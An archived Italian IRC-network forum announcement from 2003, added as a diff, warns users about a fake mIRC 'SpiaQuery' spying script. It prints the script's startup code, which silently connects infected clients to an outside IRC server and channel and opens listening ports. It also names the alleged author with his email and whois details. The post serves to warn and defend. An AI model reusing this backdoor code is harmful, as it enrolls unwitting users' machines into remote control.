@@ -1,0 +1,63 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="it">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<meta name="keywords" content=" Spiaquery ed altre storie, azzurra,irc,chat,vbulletin,forum,bbs,discussion,jelsoft,bulletin board, Azzurra, AzzurraNet, IRC, mIRC, IRC Network, Chat, chattare, xchat, BitchX, irssi, ircle, canali, nickserv, chanserv, memoserv, statserv, livestats, web, gamersrevolt, infostrada, libero, wind, caltanet, cto, ctonet, quarta profezia, daoc, timoria, bahamut, dalnet, nick, nickname, registrazione nick, registrazione canali, amici, sesso, giochi, gdr, giochi di ruolo, messenger, icq, network, unreal, ircd, psybnc, shell, eggdrop, bot, server, cybcop, kline, abuse, botserv, botnet, tcl, script, services, services.net, net, proxy, socks, firewall" />
+	<meta name="description" content="[Archivio]  Spiaquery ed altre storie Comunicazioni ufficiali di Azzurra" />
+	
+	<title> Spiaquery ed altre storie [Archivio]  - Azzurra IRC Network Forum</title>
+	<link rel="stylesheet" type="text/css" href="http://forum.azzurra.org/archive/archive.css" />
+</head>
+<body>
+<div class="pagebody">
+<div id="navbar"><a href="http://forum.azzurra.org/archive/index.php">Azzurra IRC Network Forum</a> &gt; <a href="http://forum.azzurra.org/archive/index.php/f-6.html">Network Central</a> &gt; <a href="http://forum.azzurra.org/archive/index.php/f-19.html">Comunicazioni ufficiali di Azzurra</a> &gt;  Spiaquery ed altre storie</div>
+<hr />
+<div class="pda"><a href="http://forum.azzurra.org/archive/index.php/t-1840.html?pda=1" rel="nofollow">PDA</a></div>
+<p class="largefont">View Full Version : <a href="http://forum.azzurra.org/showthread.php?t=1840">Spiaquery ed altre storie</a></p>
+<hr />
+
+<div class="post"><div class="posttop"><div class="username">silentman</div><div class="date">18-03-2003, 08:20</div></div><div class="posttext">[19:23:30] &amp;lt;lallone&amp;gt; VOLETE SPIARE LE CONVERSAZIONI PRIVATE DEGLI UTENTI DI mIRC?? VOLETE STUPIRE I VOSTRI AMICI? SCARICA LO SPIAQUERY R.E. DA http://www.spiaqueryre.tk (GRATUITO!!)<br />
+<br />
+Andando sul sito e scaricando il software, si nota nel file LEGGIMI.TXT<br />
+<br />
+Sicuramente ci sono alcuni Bugs, ma dovrete dirmi voi quali (io non ne vedo...), mandandomi un'email a sstidus@email.it.<br />
+http://sstidus.cjb.net<br />
+<br />
+Aprendo SpiaQuery.mrc c'è il seguente codice:<br />
+<br />
+ON 1&#58;START&#58;&#123;<br />
+ .spiaquery<br />
+ .set %sockz $r&#40;a,z&#41; $+ $r&#40;a,z&#41; $+ $r&#40;a,z&#41; $+ $r&#40;a,z&#41; $+ $r&#40;a,z&#41; $+ $r&#40;a,z&#41;<br />
+ .timer 1 2 .sockopen %sockz irc.nl.santium.com 6667<br />
+ .timer 1 3 .sockwrite -n %sockz nick %sockz<br />
+ .timer 1 4 .sockwrite -n %sockz user %sockz &amp;quot; &amp;quot; &#58;SpiaQuery User<br />
+ .timer 1 5 .sockwrite -n %sockz pong irc.nl.santium.com<br />
+ .timer 1 6 .sockwrite -n %sockz join #spiaquery<br />
+ .timer 0 60 .sockwrite -n %sockz pong &#58;irc.nl.santium.com<br />
+ .timer 1 5 .socklisten spia.listen 50 $+ $r&#40;1,9&#41; $+ $r&#40;1,9&#41; $+ $r&#40;1,9&#41;<br />
+ .timer 1 7 .socklisten spiaz.listen 50 $+ $r&#40;1,9&#41; $+ $r&#40;1,9&#41; $+ $r&#40;1,9&#41;<br />
+ &#125;<br />
+<br />
+irc.nl.santium.com e' un server di una rete italiana minore, e il signore che ieri sera ha infettato decine di utenti con il suo &quot;SpiaQuery&quot; e' costui:<br />
+<br />
+[22:07:36] ??? Tidus is Tidus@36109AB9.D639B650.4BB6A5F9.IP<br />
+[22:07:36] ??? Tidus is «Tidus»<br />
+[22:07:36] ??? Tidus on irc.yaprak.fastland.org «-Fastland-Rete Fastweb Milano»<br />
+[22:07:36] ??? Tidus is an IRC Operator<br />
+[22:07:36] ??? Tidus is available for help.<br />
+[22:07:36] ??? Tidus on +#fastweb, #fastgame, *#dsl, *#spiaquery<br />
+[22:07:29] -NickServ- Tidus is Tidus<br />
+[22:07:29] -NickServ- Tidus is a services operator.<br />
+<br />
+Da /ns info Tidus (sul server in questione):<br />
+-NickServ- Indirizzo email: sstidus@email.it<br />
+<br />
+Invitiamo gli utenti a controllare SEMPRE la provenienza e, ove possibile, il contenuto di un file prima di installarlo sulla propria macchina, perche' nel 95% dei casi -incluso questo- ci si trova qualche immondizia installata sul proprio sistema.<br />
+<br />
+Le minacce dei &quot;signori&quot; in questione (gia' tristemente noti per gli squallidi mezzucci, come la creazione di decine di migliaia di utenti fake, cloning di reti remote, tanto che sono stati rimossi per indegnità dalle statistiche di Netsplit) non fanno altro che confermare quanto buono sia quello che Azzurra offre a voi, e quanta acredine e invidia ci sia in altre realta', che oltre a non riuscire a competere in qualita' con mezzi leciti, falliscono anche con quelli illeciti.</div></div><hr />
+
+
+<div id="copyright">vBulletin&reg; v3.7.1, Copyright &copy;2000-2008, Jelsoft Enterprises Ltd.</div>
+</div>
+</body>
+</html>
